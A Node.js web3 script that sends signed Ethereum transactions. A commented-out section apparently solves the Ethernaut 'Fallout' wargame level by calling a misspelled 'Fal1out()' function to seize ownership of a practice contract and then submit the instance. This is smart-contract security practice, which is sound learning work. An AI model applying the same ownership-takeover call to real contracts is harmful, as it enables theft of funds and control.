const { web3 } = require('../utils/getWeb3.js');
const { encodeMethodIdWithParameters, getSignedData } = require('../utils/helpers.js');

// const mainContractAddress = "0xf912de5f8d0dac8ca70c9f4a0d460950e9537850";
const mainContractAddress = "0xC24b53D5964a80cbBDa8AED9d48d689DDcf1Cf29"
const level2Address = "0xacdb8f800d8fe8c743f15df8d41f9a91efb54ed1";

const deploySignedData = async function () {
    const deployData = await getSignedData("storeNum()", mainContractAddress);
    
    const resultData = await web3.eth.sendSignedTransaction(deployData.raw)
                        .on('transactionHash', function (hash) {
                            console.log(hash);
                        }).on('error', function(error){
                            console.log(error);
                        });

    return resultData;
        // .on('transactionHash', function (hash) {
        //     console.log(hash);
        // }).on('receipt', function (receipt) {
        //     return receipt.logs[0]['data'];
        // }).on('error', function (error) {
        //     console.log(error);
        // });
}

deploySignedData().then(data => {
    console.log('inside data');
    console.log(data)
})

// const deploySignedData = async function () {
//     const deployData = await getSignedData("createLevelInstance(address)", mainContractAddress, ['address'], [level2Address]);
//     web3.eth.sendSignedTransaction(deployData.raw)
//         .on('transactionHash', function (hash) {
//             console.log(hash);
//         }).on('receipt', function (receipt) {
//             initHack(receipt.logs[0]['data']);
//         }).on('error', function (error) {
//             console.log(error);
//         });
// }

// const initHack = async function (instanceAddress) {
//     const addressFormat = '0x' + instanceAddress.slice(26);
//     const hackData = await getSignedData("Fal1out()", addressFormat);
//     web3.eth.sendSignedTransaction(hackData.raw)
//         .on('transactionHash', function (hash) {
//             console.log(hash);
//         })
//         .on('receipt', function (receipt) {
//             console.log('submitting instance');
//             console.log('addressFormat', addressFormat);
//             submitInstance(addressFormat);
//         }).on('error', function (error) {
//             console.log(error)
//         });
// }

// const submitInstance = async function (instanceAddress) {
//     // submitLevelInstance(address _instance)
//     const instanceData = await getSignedData("submitLevelInstance(address)", mainContractAddress, ['address'], [instanceAddress]);
//     web3.eth.sendSignedTransaction(instanceData.raw)
//         .on('transactionHash', function (hash) {
//             console.log(hash);
//         })
//         .on('receipt', function (receipt) {
//             console.log(receipt);
//         })
//         .on('error', function (error) {
//             console.log(error);
//         });
// }
